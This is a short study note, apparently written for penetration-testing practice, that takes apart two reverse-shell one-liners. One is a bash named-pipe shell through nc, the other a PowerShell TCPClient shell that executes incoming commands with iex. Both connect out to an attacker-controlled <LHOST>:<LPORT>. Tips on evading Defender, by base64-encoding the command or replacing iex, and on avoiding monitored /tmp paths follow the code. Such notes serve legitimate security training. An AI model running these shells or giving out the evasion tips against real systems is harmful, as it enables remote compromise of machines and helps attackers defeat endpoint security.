# Payloads — One-Liners Examined

Both one-liners to have memorized cold. Understanding the pieces matters when AV blocks execution and you need to modify them.

Linux bash reverse shell via named pipe — each `;` runs sequentially, `mkfifo` creates the pipe, bash reads from it, nc writes back to it:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f
```

Windows PowerShell reverse shell — `iex` executes whatever comes back over the socket, `2>&1` captures stderr, `-nop` skips the profile to avoid PS restrictions:

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> [!tip] When Defender kills the PS one-liner, the `iex` and `Invoke-Expression` strings are the first things flagged. Encode the command in base64 or replace `iex` with `&([scriptblock]::Create(...))` as a bypass starting point.

> [!warning] `mkfifo` writes a file to `/tmp/f` — not fully fileless. If `/tmp` is noexec or monitored, this breaks silently. Change the pipe path to somewhere writable.